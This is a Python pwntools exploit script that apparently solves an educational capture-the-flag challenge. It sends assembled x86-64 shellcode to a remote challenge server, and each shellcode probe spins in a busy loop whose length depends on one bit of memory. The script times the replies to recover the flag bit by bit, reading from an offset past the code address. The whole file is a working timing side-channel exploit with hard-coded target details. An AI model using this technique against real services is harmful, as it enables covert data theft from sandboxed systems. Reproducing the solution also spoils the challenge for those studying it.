#!/usr/bin/python3
import time
from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux','splitw','-h']

def get_a_bit(register, reg_offset, bit, local):
    if local == 1:
        target = process('share/chal')
        gdb.attach(target)
    else:
        target = remote('edu-ctf.zoolab.org', 10002)
    payload = asm('mov al, BYTE PTR ds:[' + register + '+' + str(reg_offset) + '''];
    xor r11, r11;
    shr al, ''' + str(bit) +''';
    shl al, 7;
    shr al, 7;
    imul rax, 0x20000000
    loop_start:
    cmp rax, r11;
    je loop_finished;
    inc r11;
    imul ebx, 0x13;
    jmp loop_start;
    loop_finished:
    ''')
    target.sendafter('talk is cheap, show me the code\n', payload)
    before = time.time()
    print(target.recvall())
    after = time.time()
    diff = after - before
    print(diff)
    if diff > 0.2:
        print('the bit is 1')
        return 1
    else:
        print('the bit is 0')
        return 0
    target.close()

def get_a_byte(register, reg_offset, local):
    bit_string = ''
    for i in range(8):
        bit_string = str(get_a_bit(register, reg_offset, i, local)) + bit_string
    print(bit_string)
    return int(bit_string, 2)

def start_of_code_bit(reg_offset, bit, local):
    if local == 1:
        target = process('share/chal')
        gdb.attach(target)
    else:
        target = remote('edu-ctf.zoolab.org', 10002)    
    payload = asm('''
    mov rbx, QWORD PTR ds:[rsp];
    add rbx, 0x2c64;
    mov al, BYTE PTR ds:[rbx+''' + str(reg_offset) + '''];
    xor r11, r11;
    shr al, ''' + str(bit) +''';
    shl al, 7;
    shr al, 7;
    imul rax, 0x40000000
    loop_start:
    cmp rax, r11;
    je loop_finished;
    inc r11;
    imul ebx, 0x13;
    jmp loop_start;
    loop_finished:
    ''')
    target.sendafter('talk is cheap, show me the code\n', payload)
    before = time.time()
    print(target.recvall())
    after = time.time()
    diff = after - before
    print(diff)
    if diff > 0.2:
        print('the bit is 1')
        return 1
    else:
        print('the bit is 0')
        return 0
    target.close()

def start_of_code_byte(reg_offset, local):
    bit_string = ''
    for i in range(8):
        bit_string = str(start_of_code_bit(reg_offset, i, local)) + bit_string
    print(bit_string)
    return int(bit_string, 2)

local = 0

# byte = hex(start_of_code_byte(0, local))
# print('current byte is', byte)

flag = ''
for i in range(0x30):
    byte = start_of_code_byte(i, local)
    flag += chr(byte)
print(flag)